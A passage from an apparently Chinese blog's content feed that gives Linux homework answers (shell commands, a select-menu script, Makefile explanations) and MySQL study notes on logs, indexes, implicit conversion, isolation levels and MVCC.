<li>&lt;options&gt;：挂载选项，用于指定挂载时的各种选项，例如rw（读写）、ro（只读）、noexec（禁止执行程序）、nosuid（禁止SUID&#x2F;SGID）等</li>
<li>&lt;dump&gt;：备份标志，用于指定是否备份该文件系统，设置为0表示不备份</li>
<li>&lt;pass&gt;：文件系统检查顺序，用于指定系统启动时按照什么顺序检查文件系统，设置为1表示在根文件系统之后检查，值为2则表示该文件系统将在所有值为1的文件系统之后检查</li>
</ul>
<p><em>c) 用命令行实现： 从光盘制作一个.iso 文件，如果成功将光盘弹出。</em></p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">dd <span class="attribute">if</span>=/dev/cdrom <span class="attribute">of</span>=/path/to/image.iso &amp;&amp; eject</span><br></pre></td></tr></table></figure>



<h4 id="附加题："><a href="#附加题：" class="headerlink" title="附加题："></a>附加题：</h4><img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20241215213113214.png" alt="image-20241215213113214" style="zoom:50%;" />

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> /tmp/gsl</span><br><span class="line">find . -name <span class="string">&quot;makefile&quot;</span> -<span class="built_in">type</span> f -print0 | xargs -0 -I&#123;&#125; <span class="built_in">cp</span> &#123;&#125; /home/usrname/gsl/&#123;&#125;</span><br></pre></td></tr></table></figure>



<h3 id="作业2"><a href="#作业2" class="headerlink" title="作业2"></a>作业2</h3><h4 id="task1-1"><a href="#task1-1" class="headerlink" title="task1"></a>task1</h4><p>用命令行打印 HOME、PATH、SHLVL、LOGNAME 变量的值：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="variable">$HOME</span></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$PATH</span></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$SHLVL</span></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$LOGNAME</span></span><br></pre></td></tr></table></figure>



<h4 id="task2-1"><a href="#task2-1" class="headerlink" title="task2"></a>task2</h4><p>请用中文解释 Shell 脚本程序，并说明运行结果：</p>
<pre><code>	*#!/bin/sh* 
	*clear* 
 *select item in Continue Finish* 
 *do* 
 	*case “$item” in* 
	  *Continue) ;;* 
	  *Finish) break ;;* 
	 **) echo “Wrong choice! Please select again!” ;;*
	    *esac*
 *done*
</code></pre>
<p>​	该脚本提供一个简单的交互式菜单，让用户选择继续或结束程序。<br>​	具体地，先使用clear清除屏幕上的所有输出，然后用select显示一个包括Continue和Finish两个选项的菜单，用户选择Continue时会继续循环，选择Finish则会用break退出循环，选择其他的则会打印错误提示，然后继续循环要求重新选择。</p>
<h4 id="task3"><a href="#task3" class="headerlink" title="task3"></a>task3</h4><p>阅读下列 Makefile 并用中文说明其含义：</p>
<p> <em>&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;Makefile1&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</em><br>	<em>export Top:&#x3D;$（shell pwd}</em><br>	<em>export Src:&#x3D;$(Top)&#x2F;src&#x2F;</em><br>	<em>export Include:&#x3D;$(Top)&#x2F;include&#x2F;</em><br>	<em>export Build:&#x3D;$(Top)&#x2F;build&#x2F;</em><br>	<em>all:</em><br>		<em>@$(MAKE) -C $(Src)</em><br>	 <em>install:</em><br>		<em>@cp $(Build)&#x2F;test $(Top)</em><br>	 <em>clean:</em><br>		<em>@-rm -rf $(Build) $(Top)&#x2F;test</em> </p>
<p><em>&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; Makefile2&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</em><br>	<em>all:main.o test4.o</em><br>		<em>@mkdir -p $(Build)</em><br> 	   <em>@mv /</em>.o $(Build) *<br> 	   <em>$(MAKE) -C $(Src)&#x2F;dir1</em><br>  	  <em>$(MAKE) -C $(Src)&#x2F;dir2</em><br>	    <em>$(CC) -o $(Build)&#x2F;test $(Build)&#x2F;*.o $(Build)&#x2F;dir1&#x2F;*.o $(Build)&#x2F;dir2&#x2F;*.o</em><br>	<em>main.o : $(Include)&#x2F;func.h</em><br>		<em>$(CC) -c main.c -I$(Include)</em></p>
<p>​	Makefile1首先声明了四个环境变量，分别为Top（指向当前目录），Src（指向Top目录下的src目录），Include（指向Top目录下的include目录）和Build（指向Top目录下的build目录）。<br>​	定义了make all指令为在src目录下执行make命令；定义了make install指令为将$(Build)&#x2F;test中的文件复制到$(Top)下；定义了make clean指令为删除$(Build)&#x2F;test和$(Top)&#x2F;test中的所有文件。</p>
<p>​	Makefile2的功能是生成可执行文件。<br>​	指令make all依赖于main.o和test4.o两个目标（即需要先编译生成 main.o 和 test4.o 两个目标）；它会先在$(Build)路径生成build目录，然后将所有后缀为.o的文件移动到build目录下；然后执行 $(Src)&#x2F;dir1 和 $(Src)&#x2F;dir2 目录中的 Makefile，从而编译这两个目录下的源文件并生成对应目标文件；然后用gcc编译器将$(Build) 、$(Src)&#x2F;dir1、$(Src)&#x2F;dir2 三个目录下的所有目标文件链接起来，并生成可执行文件保存到 $(Build)&#x2F;test目录下。<br>​	定义了一个main.o的目标，其生成依赖于$(Include)下的func.h文件；生成方法是，使用gcc编译器编译main.c文件，并且指定了头文件在$(Include)中。</p>
<h3 id="作业3"><a href="#作业3" class="headerlink" title="作业3"></a>作业3</h3><p>​	地址：<a href="https://git.nju.edu.cn/bin/linuxcommand">垃圾桶 &#x2F; LinuxCommand · 极狐GitLab</a></p>
]]></content>
      <categories>
        <category>Linux程序设计</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>Mysql——三大日志</title>
    <url>/2025/03/05/Mysql%E5%85%AB%E8%82%A1%E2%80%94%E2%80%94%E4%B8%89%E5%A4%A7%E6%97%A5%E5%BF%97/</url>
    <content><![CDATA[<h2 id="Redo-log-重做日志"><a href="#Redo-log-重做日志" class="headerlink" title="Redo log 重做日志"></a>Redo log 重做日志</h2><p>作用：redo log为innodb独有，用于崩溃恢复，保证数据的持久性和完整性。</p>
<h3 id="刷盘时机"><a href="#刷盘时机" class="headerlink" title="刷盘时机"></a>刷盘时机</h3><ol>
<li>根据innodb_flush_log_at_trx_commit：<ul>
<li>0：每次事务提交不进行刷盘</li>
<li>1：每次事务提交都进行刷盘</li>
<li>2：每次事务提交，将log buffer中的redo log写入page cache</li>
</ul>
</li>
<li>当log buffer中缓存的redo log占其容量约一半时，进行刷盘</li>
<li>当事务日志缓冲区（transaction log buffer）满时，触发刷盘</li>
<li>innodb定期执行检查点操作，将内存中脏数据刷新到磁盘，并将对应redo log一并刷新</li>
<li>innodb有一个后台线程，周期性地（1秒）将脏页与相关redo log刷新到磁盘</li>
<li>mysql服务器关闭时，会刷新</li>
</ol>
<img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20250312112041112.png" alt="image-20250312112041112" style="zoom:50%;" />

<span id="more"></span>

<h3 id="存储形式"><a href="#存储形式" class="headerlink" title="存储形式"></a>存储形式</h3><p>redo log以日志文件组的形式存储在磁盘上，每个日志文件组包含多个日志文件，每个文件大小一样。</p>
<p>采用环形数组形式，从头循环写。</p>
<img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20250312112217377.png" alt="image-20250312112217377" style="zoom: 33%;" />

<ul>
<li>write pos：当前记录的位置，一边写一边后移</li>
<li>checkpoint：当前要擦出的位置，一边擦一边后移</li>
</ul>
<p>每次刷盘 redo log 记录到日志文件组中，write pos位置就会后移更新。</p>
<p>每次 MySQL 加载日志文件组恢复数据时，会清空加载过的 redo log 记录，并把 checkpoint后移更新。</p>
<p>如果 write pos追上 checkpoint，表示日志文件组满了，这时候不能再写入新的 redo log 记录，MySQL 得停下来，清空一些记录，把 checkpoint推进一下。</p>
<h2 id="Binlog"><a href="#Binlog" class="headerlink" title="Binlog"></a>Binlog</h2><p>作用：</p>
<ol>
<li>主从同步和数据备份</li>
<li>数据恢复，可以通过binlog恢复到任意时间点的数据</li>
<li>审计与数据分析</li>
</ol>
<h3 id="记录格式"><a href="#记录格式" class="headerlink" title="记录格式"></a>记录格式</h3><ol>
<li>statement：记录sql语句原文，对于now()、random()等无法保持一致。</li>
<li>row：记录sql语句和操作的具体数据，row格式的记录需要通过mysqlbinlog工具进行解析。row可以保持一致性，但占据空间，影响性能。</li>
<li>mixed：先判断sql语句是否会引起数据不一致，决定用row还是statement。</li>
</ol>
<img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20250312112610370.png" alt="image-20250312112610370" style="zoom:50%;" />

<img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20250312112617451.png" alt="image-20250312112617451" style="zoom:50%;" />

<h3 id="写入机制"><a href="#写入机制" class="headerlink" title="写入机制"></a>写入机制</h3><p>事务执行过程中，binlog写入binlog cache，每个线程都有单独的binlog cache，以保证一个事物的binlog不会被拆开。</p>
<p>当事务提交时，再写入pagecache（write），以及之后刷盘（fsync）。</p>
<p>根据sync_binlog参数：</p>
<ul>
<li>0：每次提交事务只write，由系统决定何时执行fsync</li>
<li>1：每次提交事务都会fsync</li>
<li>N：积累N个事务后再一并fsync</li>
</ul>
<h3 id="两阶段提交"><a href="#两阶段提交" class="headerlink" title="两阶段提交"></a>两阶段提交</h3><img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20250312113240348.png" alt="image-20250312113240348" style="zoom:50%;" />

<p>事务执行期间，更新数据先是写入redo log的prepare阶段；提交事务后，写入binlog，再将redo log的prepare阶段改为commit阶段。</p>
<ol>
<li>当写入binlog时发生异常，恢复时由于发现redo log还在prepare阶段且没有对于binlog，因此回滚事务即可。</li>
<li>当设置commit时发生异常，由于能找到binlog，直接提交事务即可。</li>
</ol>
<h2 id="Undo-log"><a href="#Undo-log" class="headerlink" title="Undo log"></a>Undo log</h2><p>作用：</p>
<ol>
<li>事务回滚，保证原子性</li>
<li>在MVCC中提供数据的历史版本</li>
</ol>
<p>undo log属于逻辑日志，对于每一条sql语句，记录其相反的操作。</p>
]]></content>
      <categories>
        <category>技术分享</category>
      </categories>
      <tags>
        <tag>MySQL</tag>
      </tags>
  </entry>
  <entry>
    <title>Mysql——索引</title>
    <url>/2025/03/06/Mysql%E5%85%AB%E8%82%A1%E2%80%94%E2%80%94%E7%B4%A2%E5%BC%95/</url>
    <content><![CDATA[<h2 id="数据结构"><a href="#数据结构" class="headerlink" title="数据结构"></a>数据结构</h2><h3 id="哈希表"><a href="#哈希表" class="headerlink" title="哈希表"></a>哈希表</h3><p>可以O(1)的检索数据；</p>
<p>hash索引由于数据是随机的，不支持顺序和范围查询；</p>
<h3 id="二叉查找树"><a href="#二叉查找树" class="headerlink" title="二叉查找树"></a>二叉查找树</h3><p>性能依赖于平衡程度，最坏情况下会退化至O(n)；</p>
<h3 id="AVL树（自平衡二叉查找树）"><a href="#AVL树（自平衡二叉查找树）" class="headerlink" title="AVL树（自平衡二叉查找树）"></a>AVL树（自平衡二叉查找树）</h3><p>进行 O(logn) 次数的旋转操作，需要频繁地进行旋转操作来保持平衡，会有较大的计算开销；</p>
<p>每个树节点仅存储一个数据，因此一次磁盘IO只能获取一个数据；</p>
<h3 id="红黑树"><a href="#红黑树" class="headerlink" title="红黑树"></a>红黑树</h3><p>插入和删除节点时只需进行 O(1) 次数的旋转和变色操作；</p>
<p>平衡性相对较弱，可能会导致树的高度较高，导致一些数据需要进行多次磁盘 IO 操作才能查询到；</p>
<p>每个树节点仅存储一个数据，因此一次磁盘IO只能获取一个数据；</p>
<p><strong>更适合数据在内存的情况</strong>；</p>
<h3 id="B树（多路平衡二叉树）"><a href="#B树（多路平衡二叉树）" class="headerlink" title="B树（多路平衡二叉树）"></a>B树（多路平衡二叉树）</h3><p>所有节点既存放key也存放data；</p>
<h3 id="B-树"><a href="#B-树" class="headerlink" title="B+树"></a>B+树</h3><p>只有叶子节点存放 key 和 data，其他内节点只存放 key，因此检索的效率都是稳定的；</p>
<p>每个叶子节点有一条引用链指向与它相邻的叶子节点；进行范围查询时，只需要找到下界后，对链表进行遍历即可；</p>
<p>每个节点存放多个key或data，减少了树高，而且一次磁盘IO可以取多个值，减少了IO次数。</p>
<h2 id="聚簇索引与非聚簇索引"><a href="#聚簇索引与非聚簇索引" class="headerlink" title="聚簇索引与非聚簇索引"></a>聚簇索引与非聚簇索引</h2><p>在innodb中，主键索引是聚簇索引，即索引结构和数据一起存放的索引。</p>
<p>其他所有索引都是二级索引，也是非聚簇索引，这些索引存的是主键。当使用二级索引查询到主键后，还要再到主键索引去查询，称为<strong>回表</strong>。</p>
<p>不过<strong>非聚簇索引不一定回表查询</strong>，如果SQL查的字段正好被索引覆盖了，那就没必要回表了，这种称为<strong>覆盖索引</strong>。</p>
<h2 id="联合索引"><a href="#联合索引" class="headerlink" title="联合索引"></a>联合索引</h2><p>使用表中的多个字段创建索引，就是 <strong>联合索引</strong>，也叫 <strong>组合索引</strong> 或 <strong>复合索引</strong>。</p>
<h3 id="最左前缀匹配原则"><a href="#最左前缀匹配原则" class="headerlink" title="最左前缀匹配原则"></a>最左前缀匹配原则</h3><p>最左前缀匹配原则指的是在使用联合索引时，MySQL 会根据索引中的字段顺序，从左到右依次匹配查询条件中的字段。如果查询条件与索引中的最左侧字段相匹配，那么 MySQL 就会使用索引来过滤数据，这样可以提高查询效率。</p>
<p>最左匹配原则会一直向右匹配，直到遇到范围查询（如 &gt;、&lt;）为止。对于 &gt;&#x3D;、&lt;&#x3D;、BETWEEN 以及前缀匹配 LIKE 的范围查询，不会停止匹配。</p>
<p>原理：联合索引的底层如下图所示，可以看到，a 是全局有序的（1, 2, 2, 3, 4, 5, 6, 7 ,8），而 b 是全局是无序的（12，7，8，2，3，8，10，5，2）。只有在 a 相同的情况才，b 才是有序的，比如 a 等于 2 的时候，b 的值为（7，8），即<strong>局部有序</strong>。</p>
<p>因此如果查询 <code>where a&gt;2 and b=7</code>，可以使用到索引a，但在a&gt;2的情况下，b是无序的，因此无法使用到索引b。</p>
<p>而如果查询 <code>where a&gt;=2 and b=7</code>，虽然a&gt;2的时候用不了索引b，但在a&#x3D;2的时候，b是有序的，因此可以使用到索引b，然后后面再用链表遍历。</p>
<p><img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20250306161018744.png" alt="image-20250306161018744"></p>
<h2 id="索引下推"><a href="#索引下推" class="headerlink" title="索引下推"></a>索引下推</h2><p><strong>索引下推（Index Condition Pushdown，简称 ICP）</strong> 是 <strong>MySQL 5.6</strong> 版本中提供的一项索引优化功能，它允许存储引擎在索引遍历过程中，执行部分 <code>WHERE</code>字句的判断条件，直接过滤掉不满足条件的记录，从而减少回表次数，提高查询效率。</p>
<p>对于查询<code>SELECT * FROM user WHERE zipcode = &#39;431200&#39; AND MONTH(birthdate) = 3;</code>，其中的 birthdate 字段使用函数导致索引失效。</p>
<p>没有索引下推之前，即使 <code>zipcode</code> 字段利用索引可以帮助我们快速定位到 <code>zipcode = &#39;431200&#39;</code> 的用户，但我们仍然需要对每一个找到的用户进行回表操作，获取完整的用户数据，再去判断 <code>MONTH(birthdate) = 3</code>。</p>
<p>有了索引下推之后，存储引擎会在使用<code>zipcode</code> 字段索引查找<code>zipcode = &#39;431200&#39;</code> 的用户时，同时判断<code>MONTH(birthdate) = 3</code>。这样，只有同时满足条件的记录才会被返回，减少了回表次数。</p>
<p>MySQL 可以简单分为 Server 层和存储引擎层这两层。Server 层处理查询解析、分析、优化、缓存以及与客户端的交互等操作，而存储引擎层负责数据的存储和读取，MySQL 支持 InnoDB、MyISAM、Memory 等多种存储引擎。</p>
<p>索引下推的<strong>下推</strong>其实就是指将部分上层（Server 层）负责的事情，交给了下层（存储引擎层）去处理。</p>
<p><strong>除了可以减少回表次数之外，索引下推还可以减少存储引擎层和 Server 层的数据传输量。</strong></p>
<h2 id="索引失效"><a href="#索引失效" class="headerlink" title="索引失效"></a>索引失效</h2><p>以下情况会导致索引失效：</p>
<ol>
<li>当select * 且 where 范围查找过大时，有可能直接走全表扫描而不是使用索引；</li>
<li>联合索引，但未遵循最左匹配原则；</li>
<li>在索引列上进行计算、函数、类型转换等操作（因为索引保存的是索引字段的原始值，而不是经过函数计算后的值）；</li>
<li>以 % 开头的 LIKE 查询比如 <code>LIKE &#39;%abc&#39;;</code>；</li>
<li>查询条件中使用 OR，且 OR 的前后条件中有一个列没有索引，涉及的索引都不会被使用到；</li>
<li>IN 或 NOT IN的取值范围较大时会导致索引失效，走全表扫描</li>
<li>发生隐式转换，当 where 查询操作符<strong>左边为字符类型</strong>时发生了隐式转换，会导致索引失效；</li>
</ol>
<h2 id="隐式转换"><a href="#隐式转换" class="headerlink" title="隐式转换"></a>隐式转换</h2><p>当操作符与不同类型的操作数一起使用时，会发生类型转换以使操作数兼容。某些转换是隐式发生的。</p>
<ol>
<li><p>两个参数至少有一个是<code>NULL</code>时，比较的结果也是<code>NULL</code>，特殊的情况是使用<code>&lt;=&gt;</code>对两个<code>NULL</code>做比较时会返回<code>1</code>，这两种情况都不需要做类型转换；</p>
</li>
<li><p>两个参数都是字符串，会按照字符串来比较，不做类型转换；</p>
</li>
<li><p>两个参数都是整数，按照整数来比较，不做类型转换；</p>
</li>
<li><p>十六进制的值和非数字做比较时，会被当做二进制串；</p>
</li>
<li><p>有一个参数是<code>TIMESTAMP</code>或<code>DATETIME</code>，并且另外一个参数是常量，常量会被转换为<code>timestamp；</code></p>
</li>
<li><p>有一个参数是<code>decimal</code>类型，如果另外一个参数是<code>decimal</code>或者整数，会将整数转换为<code>decimal</code>后进行比较，如果另外一个参数是浮点数，则会把<code>decimal</code>转换为浮点数进行比较；</p>
</li>
<li><p><strong>所有其他情况下，两个参数都会被转换为浮点数再进行比较</strong>；</p>
</li>
</ol>
<p>关于第7条，具体的：</p>
<ul>
<li><p><strong>不以数字开头</strong>的字符串都将转换为<code>0</code>。如<code>&#39;abc&#39;</code>、<code>&#39;a123bc&#39;</code>、<code>&#39;abc123&#39;</code>都会转化为<code>0</code>；</p>
</li>
<li><p><strong>以数字开头的</strong>字符串转换时会进行截取，从第一个字符截取到第一个非数字内容为止。比如<code>&#39;123abc&#39;</code>会转换为<code>123</code>，<code>&#39;012abc&#39;</code>会转换为<code>012</code>也就是<code>12</code>，<code>&#39;5.3a66b78c&#39;</code>会转换为<code>5.3</code>，其他同理。</p>
</li>
</ul>
<p>因此，隐式转化可能导致索引失效，如下：</p>
<ul>
<li><p><code>SELECT * FROM test1 WHERE num1 = &#39;10000&#39;;</code><strong>左边为 int 类型</strong><code>10000</code>，转换为浮点数还是<code>10000</code>，右边字符串类型<code>&#39;10000&#39;</code>，转换为浮点数也是<code>10000</code>。两边的转换结果都是唯一确定的，所以不影响使用索引。</p>
</li>
<li><p><code>SELECT * FROM test1 WHERE num2 = 10000;</code><strong>左边是字符串类型</strong><code>&#39;10000&#39;</code>，转浮点数为 10000 是唯一的，右边<code>int</code>类型<code>10000</code>转换结果也是唯一的。但是，因为左边是检索条件，<code>&#39;10000&#39;</code>转到<code>10000</code>虽然是唯一，但是其他字符串也可以转换为<code>10000</code>，比如<code>&#39;10000a&#39;</code>，<code>&#39;010000&#39;</code>，<code>&#39;10000&#39;</code>等等都能转为浮点数<code>10000</code>，这样的情况下，是不能用到索引的。</p>
</li>
</ul>
]]></content>
      <categories>
        <category>技术分享</category>
      </categories>
      <tags>
        <tag>MySQL</tag>
      </tags>
  </entry>
  <entry>
    <title>Mysql——事务隔离级别与MVCC</title>
    <url>/2025/03/07/Mysql%E5%85%AB%E8%82%A1%E2%80%94%E2%80%94%E4%BA%8B%E5%8A%A1%E9%9A%94%E7%A6%BB%E7%BA%A7%E5%88%AB%E4%B8%8EMVCC/</url>
    <content><![CDATA[<h2 id="四个数据库并发问题"><a href="#四个数据库并发问题" class="headerlink" title="四个数据库并发问题"></a>四个数据库并发问题</h2><p><strong>脏读（Dirty Read）</strong>：一个事务读取数据并且对数据进行了修改，这个修改对其他事务来说是可见的，即使当前事务没有提交。这时另外一个事务读取了这个还未提交的数据，但第一个事务突然回滚，导致数据并没有被提交到数据库，那第二个事务读取到的就是脏数据，这也就是脏读的由来。</p>
<p><strong>丢失修改（Lost to modify）</strong>：在一个事务读取一个数据时，另外一个事务也访问了该数据，那么在第一个事务中修改了这个数据后，第二个事务也修改了这个数据。这样第一个事务内的修改结果就被丢失，因此称为丢失修改。</p>
<p><strong>不可重复读（Unrepeatable read）</strong>：指在一个事务内多次读同一数据。在这个事务还没有结束时，另一个事务也访问该数据。那么，在第一个事务中的两次读数据之间，由于第二个事务的修改导致第一个事务两次读取的数据可能不太一样。这就发生了在一个事务内两次读到的数据是不一样的情况，因此称为不可重复读。</p>
<p><strong>幻读（Phantom read）</strong>：在一个事务读取了几行数据，接着另一个并发事务插入了一些数据时。在随后的查询中，第一个事务就会发现多了一些原本不存在的记录，就好像发生了幻觉一样，所以称为幻读。</p>
<h2 id="事务隔离级别"><a href="#事务隔离级别" class="headerlink" title="事务隔离级别"></a>事务隔离级别</h2><p>SQL定义的事务隔离级别分为四级：</p>
<p><strong>READ UNCOMMITTED 读未提交</strong>：允许读取未被提交的数据。</p>
<p><strong>READ COMMITTED 读已提交</strong>：只允许读取已被提交的数据。</p>
<p><strong>REPEATABLE READ 可重复读</strong> ：可重复读。</p>
<p><strong>SERIALIZABLE 串行执行</strong>：所有事务严格串行执行。</p>
<p>对应的会产生的并发问题：</p>
<table>
<thead>
<tr>
<th></th>
<th>脏读</th>
<th>不可重复读</th>
<th>幻读</th>
</tr>
</thead>
<tbody><tr>
<td><strong>READ UNCOMMITTED</strong></td>
<td>×</td>
<td>×</td>
<td>×</td>
</tr>
<tr>
<td><strong>READ COMMITTED</strong></td>
<td></td>
<td>×</td>
<td>×</td>
</tr>
<tr>
<td><strong>REPEATABLE READ</strong></td>
<td></td>
<td></td>
<td>×</td>
</tr>
<tr>
<td><strong>SERIALIZABLE</strong></td>
<td></td>
<td></td>
<td></td>
</tr>
</tbody></table>
<p>但对于Mysql的innodb，其REPEATABLE READ使用了MVCC + 临键锁 Next-key Lock，可以解决幻读问题。</p>
<h2 id="InnoDB行锁"><a href="#InnoDB行锁" class="headerlink" title="InnoDB行锁"></a>InnoDB行锁</h2><p><strong>记录锁（Record Lock）</strong>：属于单个行记录上的锁。</p>
<p><strong>间隙锁（Gap Lock）</strong>：锁定一个范围，不包括记录本身。</p>
<p><strong>临键锁（Next-Key Lock）</strong>：Record Lock+Gap Lock，锁定一个范围，包含记录本身，主要目的是为了解决幻读问题。记录锁只能锁住已经存在的记录，为了避免插入新记录，需要依赖间隙锁。</p>
<h2 id="MySQL事务隔离级别与实现"><a href="#MySQL事务隔离级别与实现" class="headerlink" title="MySQL事务隔离级别与实现"></a>MySQL事务隔离级别与实现</h2><p><strong>MySQL InnoDB</strong> 默认使用的隔离级别为<strong>REPEATABLE READ 可重复读</strong>。</p>
<p>对于每种级别的具体实现如下：</p>
<p>READ UNCOMMITTED：无</p>
<p>READ COMMITTED：MVCC（在每次Select前生成Read View）</p>
<p>REPEATABLE READ ：MVCC（只在事务第一次Select前生成Read View） + Next-key Lock</p>
<p>SERIALIZABLE：锁</p>
<h2 id="MySQL-InnoDB的RR级别如何解决幻读的？"><a href="#MySQL-InnoDB的RR级别如何解决幻读的？" class="headerlink" title="MySQL InnoDB的RR级别如何解决幻读的？"></a>MySQL InnoDB的RR级别如何解决幻读的？</h2><p><strong>1、执行普通 <code>select</code>，此时会以 <code>MVCC</code> 快照读的方式读取数据</strong></p>
<p>在快照读的情况下，RR 隔离级别只会在事务开启后的第一次查询生成 <code>Read View</code> ，并使用至事务提交。所以在生成 <code>Read View</code> 之后其它事务所做的更新、插入记录版本对当前事务并不可见，实现了可重复读和防止快照读下的 “幻读”。</p>
<p><strong>2、执行 select…for update&#x2F;lock in share mode、insert、update、delete 等当前读</strong></p>
<p>在当前读下，读取的都是最新的数据，如果其它事务有插入新的记录，并且刚好在当前事务查询范围内，就会产生幻读！<code>InnoDB</code> 使用 <strong>Next-key Lock</strong>来防止这种情况。当执行当前读时，会锁定读取到的记录的同时，锁定它们的间隙，防止其它事务在查询范围内插入数据。只要我不让你插入，就不会发生幻读。</p>
<h2 id="MVCC（多版本并发控制）"><a href="#MVCC（多版本并发控制）" class="headerlink" title="MVCC（多版本并发控制）"></a>MVCC（多版本并发控制）</h2><p>MVCC 是一种并发控制机制，用于在多个并发事务同时读写数据库时保持数据的一致性和隔离性。它是通过在每个数据行上维护多个版本的数据来实现的。当一个事务要对数据库中的数据进行修改时，MVCC 会为该事务创建一个数据快照，而不是直接修改实际的数据行。</p>
<p>1、读操作（SELECT）：</p>
<p>当一个事务执行读操作时，它会使用快照读取。快照读取是基于事务开始时数据库中的状态创建的，因此事务不会读取其他事务尚未提交的修改。具体工作情况如下：</p>
<ul>
<li>对于读取操作，事务会查找符合条件的数据行，并选择符合其事务开始时间的数据版本进行读取。</li>
<li>如果某个数据行有多个版本，事务会选择不晚于其开始时间的最新版本，确保事务只读取在它开始之前已经存在的数据。</li>
<li>事务读取的是快照数据，因此其他并发事务对数据行的修改不会影响当前事务的读取操作。</li>
</ul>
<p>2、写操作（INSERT、UPDATE、DELETE）：</p>
<p>当一个事务执行写操作时，它会生成一个新的数据版本，并将修改后的数据写入数据库。具体工作情况如下：</p>
<ul>
<li>对于写操作，事务会为要修改的数据行创建一个新的版本，并将修改后的数据写入新版本。</li>
<li>新版本的数据会带有当前事务的版本号，以便其他事务能够正确读取相应版本的数据。</li>
<li>原始版本的数据仍然存在，供其他事务使用快照读取，这保证了其他事务不受当前事务的写操作影响。</li>
</ul>
<p>3、事务提交和回滚：</p>
<ul>
<li>当一个事务提交时，它所做的修改将成为数据库的最新版本，并且对其他事务可见。</li>
<li>当一个事务回滚时，它所做的修改将被撤销，对其他事务不可见。</li>
</ul>
<p>4、版本的回收：</p>
<p>为了防止数据库中的版本无限增长，MVCC 会定期进行版本的回收。回收机制会删除已经不再需要的旧版本数据，从而释放空间。</p>
<p>MVCC 通过创建数据的多个版本和使用快照读取来实现并发控制。读操作使用旧版本数据的快照，写操作创建新版本，并确保原始版本仍然可用。这样，不同的事务可以在一定程度上并发执行，而不会相互干扰，从而提高了数据库的并发性能和数据一致性。</p>
<h2 id="InnoDB对于MVCC的实现"><a href="#InnoDB对于MVCC的实现" class="headerlink" title="InnoDB对于MVCC的实现"></a>InnoDB对于MVCC的实现</h2><p><code>MVCC</code> 的实现依赖于：<strong>隐藏字段、Read View、undo log</strong>。</p>
<h3 id="隐藏字段"><a href="#隐藏字段" class="headerlink" title="隐藏字段"></a>隐藏字段</h3><p>在内部，<code>InnoDB</code> 存储引擎为<strong>每行数据</strong>添加了三个隐藏字段：</p>
<ul>
<li><code>DB_TRX_ID（6字节）</code>：表示最后一次插入或更新该行的事务 id。此外，<code>delete</code> 操作在内部被视为更新，只不过会在记录头 <code>Record header</code> 中的 <code>deleted_flag</code> 字段将其标记为已删除</li>
<li><code>DB_ROLL_PTR（7字节）</code> 回滚指针，指向该行的 <code>undo log</code> 。如果该行未被更新，则为空</li>
<li><code>DB_ROW_ID（6字节）</code>：如果没有设置主键且该表没有唯一非空索引时，<code>InnoDB</code> 会使用该 id 来生成聚簇索引</li>
</ul>
<h3 id="ReadView"><a href="#ReadView" class="headerlink" title="ReadView"></a>ReadView</h3><p>ReadView是一个数据结构，属于事务，主要用来进行可见性判断。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">ReadView</span> &#123;</span><br><span class="line">  <span class="comment">/* ... */</span></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">  trx_id_t m_low_limit_id;      <span class="comment">/* 大于等于这个 ID 的事务均不可见 */</span></span><br><span class="line"></span><br><span class="line">  trx_id_t m_up_limit_id;       <span class="comment">/* 小于这个 ID 的事务均可见 */</span></span><br><span class="line"></span><br><span class="line">  trx_id_t m_creator_trx_id;    <span class="comment">/* 创建该 Read View 的事务ID */</span></span><br><span class="line"></span><br><span class="line">  trx_id_t m_low_limit_no;      <span class="comment">/* 事务 Number, 小于该 Number 的 Undo Logs 均可以被 Purge */</span></span><br><span class="line"></span><br><span class="line">  ids_t m_ids;                  <span class="comment">/* 创建 Read View 时的活跃事务列表 */</span></span><br><span class="line"></span><br><span class="line">  m_closed;                     <span class="comment">/* 标记 Read View 是否 close */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20250225162302539.png" alt="image-20250225162302539"></p>
<h3 id="undo-log"><a href="#undo-log" class="headerlink" title="undo log"></a>undo log</h3><p><code>undo log</code> 主要有两个作用：</p>
<ul>
<li>当事务回滚时用于将数据恢复到修改前的样子</li>
<li>另一个作用是 <code>MVCC</code> ，当读取记录时，若该记录被其他事务占用或当前版本对该事务不可见，则可以通过 <code>undo log</code> 读取之前的版本数据，以此实现非锁定读</li>
</ul>
<p><strong>在 <code>InnoDB</code> 存储引擎中 <code>undo log</code> 分为两种：<code>insert undo log</code> 和 <code>update undo log</code>：</strong></p>
<ol>
<li><strong><code>insert undo log</code></strong>：指在 <code>insert</code> 操作中产生的 <code>undo log</code>。因为 <code>insert</code> 操作的记录只对事务本身可见，对其他事务不可见，故该 <code>undo log</code> 可以在事务提交后直接删除。不需要进行 <code>purge</code> 操作。</li>
